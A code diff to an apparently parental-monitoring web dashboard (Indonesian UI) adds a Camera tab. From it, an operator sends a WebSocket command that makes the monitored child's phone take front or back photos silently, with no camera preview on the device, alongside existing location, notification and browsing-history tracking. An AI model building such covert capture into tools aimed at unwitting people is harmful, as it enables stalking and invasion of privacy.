@@ -11,7 +11,7 @@ import {
   Clock, BarChart2, Shield, ChevronLeft,
   Thermometer, Navigation, RefreshCw, Bell, Trash2,
   Send, MessageSquare, Lock, Eye, EyeOff, ShieldCheck,
-  Search, Filter, Mail, Play, Layers, Globe, ExternalLink,
+  Search, Filter, Mail, Play, Layers, Globe, ExternalLink, Camera,
 } from "lucide-react";
 import Link from "next/link";
 import { formatDistanceToNow } from "date-fns";
@@ -48,7 +48,7 @@ const formatTime = (dateStr: string) => {
   }
 };
 
-const tabs = ["Overview", "Apps", "Approvals", "Notifications", "Browser", "Location", "Usage", "Security"] as const;
+const tabs = ["Overview", "Apps", "Approvals", "Notifications", "Browser", "Camera", "Location", "Usage", "Security"] as const;
 type Tab = (typeof tabs)[number];
 
 export default function DeviceDetailPage() {
@@ -72,6 +72,22 @@ export default function DeviceDetailPage() {
   const [isTogglingVisibility, setIsTogglingVisibility] = useState(false);
   const [isProtectionActive, setIsProtectionActive] = useState(true);
   const [isTogglingProtection, setIsTogglingProtection] = useState(false);
+  const [isCapturing, setIsCapturing] = useState<"FRONT" | "BACK" | null>(null);
+  const [selectedPhoto, setSelectedPhoto] = useState<string | null>(null);
+  const [isClearingBrowsing, setIsClearingBrowsing] = useState(false);
+  const [isClearingCaptures, setIsClearingCaptures] = useState(false);
+  const [deletingCaptureId, setDeletingCaptureId] = useState<string | null>(null);
+
+  const handleCapturePhoto = (cameraType: "FRONT" | "BACK") => {
+    if (!socket || !device) return;
+    setIsCapturing(cameraType);
+    socket.emit("camera:request", {
+      deviceId: device.deviceId,
+      cameraType,
+    });
+    showSyncMsg(`Perintah jepret foto (${cameraType}) dikirim...`, true);
+    setTimeout(() => setIsCapturing(null), 10000);
+  };
 
   const handleToggleProtection = () => {
     if (!socket || !device) return;
@@ -161,6 +177,52 @@ export default function DeviceDetailPage() {
     }
   };
 
+  const handleClearBrowsing = async () => {
+    if (!device) return;
+    const confirmClear = window.confirm("Hapus seluruh riwayat browsing perangkat ini?");
+    if (!confirmClear) return;
+    try {
+      setIsClearingBrowsing(true);
+      await api.delete(`/devices/${id}/browsing`);
+      refetchBrowsing();
+    } catch (err) {
+      console.error("Failed to clear browsing:", err);
+    } finally {
+      setIsClearingBrowsing(false);
+    }
+  };
+
+  const handleClearCaptures = async () => {
+    if (!device) return;
+    const confirmClear = window.confirm("Hapus seluruh hasil foto snapshot perangkat ini?");
+    if (!confirmClear) return;
+    try {
+      setIsClearingCaptures(true);
+      await api.delete(`/devices/${id}/captures`);
+      refetchCaptures();
+    } catch (err) {
+      console.error("Failed to clear captures:", err);
+    } finally {
+      setIsClearingCaptures(false);
+    }
+  };
+
+  const handleDeleteSingleCapture = async (captureId: string, e: React.MouseEvent) => {
+    e.stopPropagation();
+    if (!device) return;
+    const confirmDel = window.confirm("Hapus foto ini?");
+    if (!confirmDel) return;
+    try {
+      setDeletingCaptureId(captureId);
+      await api.delete(`/devices/${id}/captures/${captureId}`);
+      refetchCaptures();
+    } catch (err) {
+      console.error("Failed to delete capture:", err);
+    } finally {
+      setDeletingCaptureId(null);
+    }
+  };
+
   const { data: device, refetch: refetchDevice, isError } = useQuery({
     queryKey: ["device", id],
     queryFn: () => api.get(`/devices/${id}`).then((r) => r.data),
@@ -207,6 +269,12 @@ export default function DeviceDetailPage() {
     queryKey: ["browsing", id],
     queryFn: () => api.get(`/devices/${id}/browsing`).then((r) => r.data),
     enabled: !!device && activeTab === "Browser",
+  });
+
+  const { data: captureList = [], refetch: refetchCaptures } = useQuery({
+    queryKey: ["captures", id],
+    queryFn: () => api.get(`/devices/${id}/captures`).then((r) => r.data),
+    enabled: !!device && activeTab === "Camera",
   });
 
   const notifAppList = useMemo(() => {
@@ -303,6 +371,13 @@ export default function DeviceDetailPage() {
     socket.on("browsing:new", (payload: { deviceId: string; browsing: any }) => {
       if (payload.deviceId === targetId || payload.deviceId === hardwareId) {
         refetchBrowsing();
+      }
+    });
+    socket.on("capture:new", (payload: { deviceId: string; capture: any }) => {
+      if (payload.deviceId === targetId || payload.deviceId === hardwareId) {
+        refetchCaptures();
+        setIsCapturing(null);
+        showSyncMsg("Foto berhasil diambil dari perangkat!", true);
       }
     });
     socket.on("approval:requested", (payload: { deviceId: string; data: any }) => {
@@ -565,6 +640,7 @@ export default function DeviceDetailPage() {
 
               {[
                 { key: "location", label: "Akses Lokasi (GPS)" },
+                { key: "camera", label: "Akses Kamera (Snapshot)" },
                 { key: "usageStats", label: "Statistik Penggunaan (Usage)" },
                 { key: "notification", label: "Izin Notifikasi (POST)" },
                 { key: "notificationAccess", label: "Baca Notifikasi (Listener)" },
@@ -961,13 +1037,25 @@ export default function DeviceDetailPage() {
                 {browsingList.length} kunjungan
               </span>
             </div>
-            <button
-              onClick={() => refetchBrowsing()}
-              className="p-1.5 rounded-lg border border-[var(--border)] hover:bg-[var(--bg-secondary)] text-slate-400 hover:text-white transition-colors"
-              title="Refresh Riwayat"
-            >
-              <RefreshCw size={14} />
-            </button>
+            <div className="flex items-center gap-2">
+              {browsingList.length > 0 && (
+                <button
+                  onClick={handleClearBrowsing}
+                  disabled={isClearingBrowsing}
+                  className="btn-danger flex items-center justify-center gap-1 text-xs py-1.5 px-3 rounded-lg border border-rose-500/30 text-rose-400 bg-rose-500/10 hover:bg-rose-500/20 cursor-pointer shrink-0"
+                >
+                  <Trash2 size={13} />
+                  {isClearingBrowsing ? "Menghapus..." : "Hapus Riwayat"}
+                </button>
+              )}
+              <button
+                onClick={() => refetchBrowsing()}
+                className="p-1.5 rounded-lg border border-[var(--border)] hover:bg-[var(--bg-secondary)] text-slate-400 hover:text-white transition-colors"
+                title="Refresh Riwayat"
+              >
+                <RefreshCw size={14} />
+              </button>
+            </div>
           </div>
 
           <p className="text-xs text-slate-400">
@@ -1022,6 +1110,135 @@ export default function DeviceDetailPage() {
                   </div>
                 );
               })}
+            </div>
+          )}
+        </div>
+      )}
+
+      {/* ── CAMERA TAB ──────────────────────────────── */}
+      {activeTab === "Camera" && (
+        <div className="glass-card p-4 sm:p-5 space-y-4">
+          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
+            <div className="flex items-center gap-2">
+              <Camera size={18} style={{ color: "var(--accent)" }} />
+              <h3 className="font-semibold text-sm sm:text-base" style={{ color: "var(--text-primary)" }}>
+                Remote Camera Snapshot
+              </h3>
+              <span className="text-xs px-2 py-0.5 rounded-full" style={{ background: "var(--bg-secondary)", color: "var(--text-muted)" }}>
+                {captureList.length} jepretan
+              </span>
+            </div>
+
+            <div className="flex items-center gap-2">
+              <button
+                onClick={() => handleCapturePhoto("FRONT")}
+                disabled={!isOnline || !!isCapturing}
+                className="flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg border border-purple-500/30 text-purple-400 bg-purple-500/10 hover:bg-purple-500/20 disabled:opacity-50 cursor-pointer"
+              >
+                <Camera size={13} className={isCapturing === "FRONT" ? "animate-spin" : ""} />
+                {isCapturing === "FRONT" ? "Menjepret Depan..." : "Jepret Kamera Depan"}
+              </button>
+              <button
+                onClick={() => handleCapturePhoto("BACK")}
+                disabled={!isOnline || !!isCapturing}
+                className="flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg border border-blue-500/30 text-blue-400 bg-blue-500/10 hover:bg-blue-500/20 disabled:opacity-50 cursor-pointer"
+              >
+                <Camera size={13} className={isCapturing === "BACK" ? "animate-spin" : ""} />
+                {isCapturing === "BACK" ? "Menjepret Belakang..." : "Jepret Kamera Belakang"}
+              </button>
+              {captureList.length > 0 && (
+                <button
+                  onClick={handleClearCaptures}
+                  disabled={isClearingCaptures}
+                  className="btn-danger flex items-center justify-center gap-1 text-xs py-1.5 px-3 rounded-lg border border-rose-500/30 text-rose-400 bg-rose-500/10 hover:bg-rose-500/20 cursor-pointer shrink-0"
+                >
+                  <Trash2 size={13} />
+                  {isClearingCaptures ? "Menghapus..." : "Hapus Semua"}
+                </button>
+              )}
+              <button
+                onClick={() => refetchCaptures()}
+                className="p-1.5 rounded-lg border border-[var(--border)] hover:bg-[var(--bg-secondary)] text-slate-400 hover:text-white transition-colors"
+                title="Refresh Daftar Foto"
+              >
+                <RefreshCw size={14} />
+              </button>
+            </div>
+          </div>
+
+          <p className="text-xs text-slate-400">
+            Perintah snapshot dikirim via WebSocket langsung ke HP anak dan diproses di background tanpa UI preview kamera.
+          </p>
+
+          {captureList.length === 0 ? (
+            <div className="py-12 text-center text-xs" style={{ color: "var(--text-muted)" }}>
+              <Camera size={36} className="mx-auto mb-2 opacity-40" />
+              <p>Belum ada foto yang diambil dari perangkat ini.</p>
+              <p className="text-[11px] mt-1 text-slate-500">
+                Klik tombol di atas untuk meminta snapshot kamera sekarang.
+              </p>
+            </div>
+          ) : (
+            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3">
+              {captureList.map((item: any) => {
+                const imgUrl = `${process.env.NEXT_PUBLIC_WS_URL || "http://localhost:3008"}${item.filePath}`;
+                return (
+                  <div
+                    key={item.id}
+                    onClick={() => setSelectedPhoto(imgUrl)}
+                    className="group relative rounded-xl overflow-hidden border border-[var(--border)] bg-black/40 cursor-pointer aspect-video flex flex-col justify-end"
+                  >
+                    {/* eslint-disable-next-line @next/next/no-img-element */}
+                    <img
+                      src={imgUrl}
+                      alt={`Capture ${item.cameraType}`}
+                      className="absolute inset-0 w-full h-full object-cover group-hover:scale-105 transition-transform duration-200"
+                      loading="lazy"
+                    />
+                    <div className="relative z-10 p-2 bg-gradient-to-t from-black/80 via-black/40 to-transparent flex items-center justify-between text-[11px]">
+                      <span className="font-mono text-[10px] px-1.5 py-0.5 rounded bg-black/60 text-white border border-white/10">
+                        {item.cameraType === "FRONT" ? "Front" : "Back"}
+                      </span>
+                      <div className="flex items-center gap-1.5">
+                        <span className="text-slate-300 text-[10px]">
+                          {formatDistanceToNow(new Date(item.capturedAt), { addSuffix: true })}
+                        </span>
+                        <button
+                          onClick={(e) => handleDeleteSingleCapture(item.id, e)}
+                          disabled={deletingCaptureId === item.id}
+                          className="p-1 rounded bg-rose-500/80 hover:bg-rose-600 text-white transition-opacity opacity-0 group-hover:opacity-100 cursor-pointer"
+                          title="Hapus foto ini"
+                        >
+                          <Trash2 size={10} />
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+                );
+              })}
+            </div>
+          )}
+
+          {/* Modal Preview Photo */}
+          {selectedPhoto && (
+            <div
+              className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4 backdrop-blur-sm"
+              onClick={() => setSelectedPhoto(null)}
+            >
+              <div className="relative max-w-4xl max-h-[90vh] overflow-hidden rounded-2xl border border-white/10 bg-black/90 p-2" onClick={(e) => e.stopPropagation()}>
+                {/* eslint-disable-next-line @next/next/no-img-element */}
+                <img
+                  src={selectedPhoto}
+                  alt="Snapshot Preview"
+                  className="max-h-[85vh] max-w-full rounded-xl object-contain mx-auto"
+                />
+                <button
+                  onClick={() => setSelectedPhoto(null)}
+                  className="absolute top-4 right-4 bg-black/70 hover:bg-black text-white px-3 py-1 rounded-full text-xs border border-white/20"
+                >
+                  Tutup
+                </button>
+              </div>
             </div>
           )}
         </div>
